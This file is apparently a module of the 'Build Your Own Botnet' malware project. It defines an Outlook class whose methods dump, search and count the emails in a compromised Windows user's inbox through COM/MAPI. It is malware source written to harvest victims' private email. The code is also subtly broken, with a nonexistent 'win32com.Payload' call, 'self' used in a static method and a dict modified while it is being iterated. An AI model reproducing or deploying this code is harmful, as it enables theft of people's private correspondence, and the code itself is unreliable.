#!/usr/bin/python
"""
Build Your Own Botnet
https://github.com/colental/byob
Copyright (c) 2018 Daniel Vega-Myhre
"""
from __future__ import print_function
import os
import sys
import json
import win32com
import pythoncom

from util import Util

class Outlook():

    emails = {}
    
    @staticmethod
    def email_inbox():
        try:
            pythoncom.CoInitialize()
            outlook = win32com.Payload.Dispatch('Outlook.Application').GetNameSpace('MAPI')
            inbox   = outlook.GetDefaultFolder(6)
            return Util.emails(inbox.Items)
        except Exception as e2:
            result  = "{} error: {}".format(self._email_dump.func_name, str(e2))

    @staticmethod
    def email_search(s):
        try:
            pythoncom.CoInitialize()
            outlook = win32com.Payload.Dispatch('Outlook.Application').GetNameSpace('MAPI')
            inbox   = outlook.GetDefaultFolder(6)
            emails  = Util.emails(inbox.Items)
            for k,v in emails.items():
                if s not in v.get('message') and s not in v.get('subject') and s not in v.get('from'):
                    emails.pop(k,v)
            return json.dumps(emails, indent=2)
        except Exception as e:
            return "{} error: {}".format(Outlook.email_search.func_name, str(e))

    @staticmethod
    def email_count():
        try:
            pythoncom.CoInitialize()
            outlook = win32com.Payload.Dispatch('Outlook.Application').GetNameSpace('MAPI')
            inbox   = outlook.GetDefaultFolder(6)
            emails  = inbox.Items
            return "\n\tEmails in Outlook inbox: %d" % len(emails)
        except Exception as e:
            return "{} error: {}".format(Outlook.email_count.func_name, str(e))
